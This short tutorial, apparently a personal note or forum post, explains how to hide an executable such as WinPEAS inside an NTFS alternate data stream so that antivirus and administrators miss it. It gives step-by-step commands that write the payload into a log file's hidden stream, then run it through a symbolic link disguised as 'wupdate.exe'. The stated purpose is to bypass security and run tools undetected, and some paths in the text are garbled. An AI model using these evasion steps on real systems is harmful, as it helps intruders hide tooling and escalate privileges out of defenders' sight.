It is possible to hide payloads within the metadata of a file. This makes it harder for AV or admins to detect malicious activity.
In order to do this on windows, follow these steps
*we will use notepad as an example, but it can be done with any text editor. 
  -notepad test.txt:secret.txt
  *this will create the file test.txt with a hidden file called secret.txt 
  The : character in the command creates an alternate data stream (ADS) associated with the test.txt file. ADSs are a feature of the NTFS file system that allows
  for multiple data streams to be associated with a single file. The second data stream, named secret.txt, is invisible to normal file operations and can only
  be accessed using methods such as the : operator or specialized file system tools.*

Now, we will hide a WinPEAS file within a file in order to bypass security. Here is how to do that
-type payload.exe > windowslog.txt:winpeas.exe
This command will take the payload.exe and hide it within windowslog.txt. This way, we can execute WinPEAS from inside the system without being detected. 
We can run the winpeas by using
-start windowslog.txt:winpeas.exe 
This may not work. In order to bypass this, we will create a symbolic link in order to execute it. 
First, we will go to the System32 dir
-cd \
Then we will create a link
-mklink wupdate.exe <path_to_hidden_file> (it would look somenthing like C\:Temp\windowslog.txt:winpeas.exe)
Now we just run the following command and TADAAAAAAAAAAAAH! 
-wupdate
